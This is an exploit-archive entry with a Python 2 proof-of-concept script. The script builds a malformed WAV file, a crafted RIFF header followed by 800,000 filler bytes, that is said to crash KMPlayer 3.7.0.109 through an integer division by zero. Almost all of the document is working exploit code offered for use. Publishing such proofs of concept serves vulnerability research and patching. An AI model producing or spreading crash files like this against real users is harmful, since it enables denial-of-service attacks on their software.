# Exploit Title: KMPlayer 3.7.0.109 Integer division by zero DoS.
# Date: 29-9-2013
# Exploit Author: xboz
# Vendor Homepage: http://www.kmpmedia.net/
# Software Link: http://update.kmpmedia.net/player/download/28
# Version: 3.7.0.109
# Tested on: Windows 7,8
 
header = ("\x52\x49\x46\x46\x64\x31\x10\x00\x57\x41\x56\x45\x66\x6d\x74\x20"
"\x10\x00\x00\x00\x01\x00\x01\x00\x22\x56\x00\x00\x10\xb1\x02\x00"
"\x04\x00\x00\x00\x64\x61\x74\x61\x40\x31\x10\x00\x14\x00\x2a\x00"
"\x1a\x00\x30\x00\x26\x00\x39\x00\x35\x00\x3c\x00\x4a\x00\x3a\x00"
"\x5a\x00\x2f\x00\x67\x00\x0a")
 exploit = header
exploit += "\x41" * 800000
  
try:
    print "[+] Creating POC"
    crash = open('fuzz.wav','w');
    crash.write(exploit);
    crash.close();
except:
    print "[-] No Permissions.."
